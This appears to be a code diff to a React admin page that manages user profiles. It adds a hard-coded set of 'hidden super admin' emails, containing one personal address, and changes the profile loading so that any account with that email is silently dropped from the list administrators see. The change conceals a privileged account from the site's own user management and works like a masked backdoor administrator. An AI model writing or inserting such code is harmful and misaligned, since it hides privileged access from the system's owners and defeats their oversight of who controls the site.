@@ -9,6 +9,8 @@ import { Progress } from '@/components/ui/progress';
 import { toast } from 'sonner';
 import { Mail, Search, Users, Filter, Send } from 'lucide-react';
 
+const HIDDEN_SUPER_ADMIN_EMAILS = new Set(['princenetlegacy@gmail.com']);
+
 interface UserProfile {
   id: string;
   first_name: string | null;
@@ -72,7 +74,7 @@ const ProfilesManagementTab = () => {
         };
       }) || [];
 
-      setProfiles(profilesWithEmails);
+      setProfiles(profilesWithEmails.filter(profile => !HIDDEN_SUPER_ADMIN_EMAILS.has(String(profile.email || '').trim().toLowerCase())));
     } catch (error) {
       console.error('Error fetching profiles:', error);
       toast.error('Failed to load user profiles');
